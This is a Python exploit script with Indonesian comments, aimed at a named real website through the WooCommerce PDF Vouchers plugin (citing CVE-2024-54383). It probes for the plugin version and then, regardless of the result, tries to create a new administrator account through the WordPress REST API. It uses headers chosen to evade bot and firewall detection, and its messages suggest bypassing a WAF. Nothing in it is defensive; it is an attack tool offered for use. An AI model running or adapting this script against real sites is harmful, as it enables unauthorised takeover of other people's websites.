import requests
import re
import json

# Konfigurasi target
TARGET_URL = "https://mudbrick.co.nz"  # Ganti dengan domain target Anda
PLUGIN_PATH = "/wp-content/plugins/woocommerce-pdf-vouchers"
PLUGIN_FILES = [
    f"{TARGET_URL}{PLUGIN_PATH}/readme.txt",
    f"{TARGET_URL}{PLUGIN_PATH}/woocommerce-pdf-vouchers.php",
    f"{TARGET_URL}{PLUGIN_PATH}/includes/class-wpv.php"
]
API_ENDPOINT = f"{TARGET_URL}/wp-json/wp/v2/users"

# Data pengguna baru untuk eksploitasi
new_user_data = {
    "username": "admin_baru",
    "password": "passwordkuat123",
    "email": "admin_baru@inidomain.com",
    "roles": ["administrator"]
}

# Headers untuk menghindari deteksi bot & firewall
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": TARGET_URL,
    "Content-Type": "application/json"
}

# Fungsi untuk mendapatkan versi plugin, tetapi tidak menghentikan eksploitasi jika gagal
def get_plugin_version():
    version = None

    for url in PLUGIN_FILES:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            match = re.search(r"(Stable tag|Version):\s*([\d\.]+)", response.text)
            if match:
                version = match.group(2)
                print(f"[+] Versi plugin ditemukan di {url}: {version}")
                return version
        elif response.status_code == 403:
            print(f"[!] Akses ke {url} diblokir (403 Forbidden). Mungkin ada proteksi .htaccess atau firewall.")

    print("[-] Tidak dapat menemukan versi plugin, tetapi eksploitasi akan tetap dijalankan.")
    return None

# Fungsi untuk mencoba eksploitasi tanpa tergantung deteksi plugin
def create_admin_account():
    session = requests.Session()
    session.headers.update(headers)

    response = session.post(API_ENDPOINT, json=new_user_data)

    if response.status_code == 201:
        print("[+] Berhasil membuat akun administrator baru!")
        print("[*] Detail Response:", response.json())
    else:
        print("[-] Gagal membuat akun administrator baru.")
        print(f"Status Code: {response.status_code}")
        try:
            response_json = response.json()
            print("[*] Response Detail:", json.dumps(response_json, indent=4))
        except json.JSONDecodeError:
            print("[*] Response Text:", response.text)

        if response.status_code == 404:
            print("[!] API endpoint tidak ditemukan. Pastikan REST API WordPress aktif dan jalur yang digunakan benar.")
        elif response.status_code == 403:
            print("[!] Server menolak akses (403 Forbidden). Coba gunakan metode lain atau bypass WAF.")
        elif response.status_code == 500:
            print("[!] Server mengalami error internal. Mungkin ada masalah dengan database atau konfigurasi WordPress.")

# Eksekusi eksploitasi langsung tanpa tergantung pada pengecekan plugin
plugin_version = get_plugin_version()
if plugin_version:
    if plugin_version < "4.9.9":
        print("[!] Versi plugin rentan terhadap CVE-2024-54383! Menjalankan eksploitasi...")
    else:
        print("[+] Plugin telah diperbarui, tetapi tetap mencoba eksploitasi.")
else:
    print("[-] Tidak dapat menemukan versi plugin, tetapi tetap mencoba eksploitasi.")

# Jalankan eksploitasi
create_admin_account()
